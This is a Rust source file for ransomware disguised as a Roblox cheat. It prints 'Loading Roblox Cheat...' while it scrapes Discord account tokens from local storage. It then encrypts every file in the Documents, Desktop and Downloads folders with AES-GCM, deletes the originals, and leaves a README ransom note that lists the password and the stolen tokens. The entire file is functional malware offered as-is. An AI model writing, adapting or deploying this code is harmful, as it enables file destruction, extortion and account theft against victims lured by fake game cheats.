// Ransomware/src/main.rs
use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};
use rand::Rng;
use sha2::{Digest, Sha256};
use std::fs;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

const PASSWORD: &str = "roblox123";
const EXTENSION: &str = ".encrypted";

fn derive_key(password: &str) -> [u8; 32] {
    let mut hasher = Sha256::new();
    hasher.update(password.as_bytes());
    let result = hasher.finalize();
    let mut key = [0u8; 32];
    key.copy_from_slice(&result);
    key
}

fn grab_discord_tokens() -> Vec<String> {
    let mut tokens = Vec::new();
    
    let discord_paths = vec![
        dirs::data_dir().map(|p| p.join("discord")),
        dirs::data_dir().map(|p| p.join("discordcanary")),
        dirs::data_dir().map(|p| p.join("discordptb")),
    ];
    
    for path in discord_paths.into_iter().flatten() {
        let leveldb = path.join("Local Storage").join("leveldb");
        if !leveldb.exists() {
            continue;
        }
        
        if let Ok(entries) = fs::read_dir(&leveldb) {
            for entry in entries.flatten() {
                let file_path = entry.path();
                if let Ok(content) = fs::read(&file_path) {
                    let content_str = String::from_utf8_lossy(&content);
                    extract_tokens(&content_str, &mut tokens);
                }
            }
        }
    }
    
    tokens
}

fn extract_tokens(content: &str, tokens: &mut Vec<String>) {
    let patterns = ["mfa.", "token\":\""];
    
    for pattern in &patterns {
        let mut start = 0;
        while let Some(pos) = content[start..].find(pattern) {
            let abs = start + pos + pattern.len();
            if let Some(end) = content[abs..].find('"') {
                let token = &content[abs..abs + end];
                if token.len() > 20 && token.len() < 100 && !tokens.contains(&token.to_string()) {
                    tokens.push(token.to_string());
                }
            }
            start = abs;
        }
    }
}

fn encrypt_files(dirs: &[PathBuf], key: &[u8; 32]) {
    for dir in dirs {
        for entry in WalkDir::new(dir).follow_links(false) {
            if let Ok(entry) = entry {
                if entry.file_type().is_file() {
                    let path = entry.path();
                    if path.extension().map_or(false, |e| e != "encrypted") {
                        let _ = encrypt_file(path, key);
                    }
                }
            }
        }
    }
}

fn encrypt_file(path: &Path, key: &[u8; 32]) -> Result<(), ()> {
    let data = fs::read(path).map_err(|_| ())?;
    let cipher = Aes256Gcm::new_from_slice(key).map_err(|_| ())?;
    let nonce_bytes: [u8; 12] = rand::thread_rng().gen();
    let nonce = Nonce::from_slice(&nonce_bytes);
    let ciphertext = cipher.encrypt(nonce, data.as_ref()).map_err(|_| ())?;
    
    let mut encrypted = Vec::new();
    encrypted.extend_from_slice(&nonce_bytes);
    encrypted.extend_from_slice(&ciphertext);
    
    let new_path = format!("{}{}", path.display(), EXTENSION);
    fs::write(&new_path, &encrypted).map_err(|_| ())?;
    fs::remove_file(path).map_err(|_| ())?;
    Ok(())
}

fn main() {
    println!("Loading Roblox Cheat...");
    
    let tokens = grab_discord_tokens();
    
    let key = derive_key(PASSWORD);
    let target_dirs = vec![
        dirs::document_dir().unwrap_or_default(),
        dirs::desktop_dir().unwrap_or_default(),
        dirs::download_dir().unwrap_or_default(),
    ];
    
    encrypt_files(&target_dirs, &key);
    
    let ransom_note = format!(
        "FILES ENCRYPTED\nPassword: {}\nDiscord Tokens: {:?}",
        PASSWORD,
        tokens
    );
    
    if let Some(desktop) = dirs::desktop_dir() {
        let _ = fs::write(desktop.join("README.txt"), ransom_note);
    }
    
    println!("Done.");
}
